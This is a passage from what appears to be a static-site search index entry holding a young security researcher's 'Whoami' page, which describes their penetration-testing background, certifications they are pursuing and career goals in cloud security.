enhances my understanding of criminal behavior and law enforcement, providing a broader perspective on how to protect systems and data from various threats.\n✨ Future plans I plan to pursue in the field of Cloud Security and Penetration Testing. My goal, is never to be the best but to always keep learning, improving, and making a meaningful impact in the field of cybersecurity.\n“The only way to do great work is to love what you do.” – Steve Jobs\n","permalink":"http://localhost:1313/whoami/","summary":"❓ Introduction Hii, I am a 20 yr/old security researcher/penetration tester with extensive networking, scripting, linux administration, active directory and a little cloud experience. Familiarity with security frameworks including OWASP Top 10, Microsoft SDL, MITRE ATT\u0026amp;CK Framework and SANS Top 25. Knowledgeable on defensive security concepts including SIEM and threat hunting. Actively pursuing the OSCP certification and cloud security to further validate proficiency and skill set.\n💻 Infosec, or about 80% of my life My love for Infosec started six years ago.","title":"Whoami"}]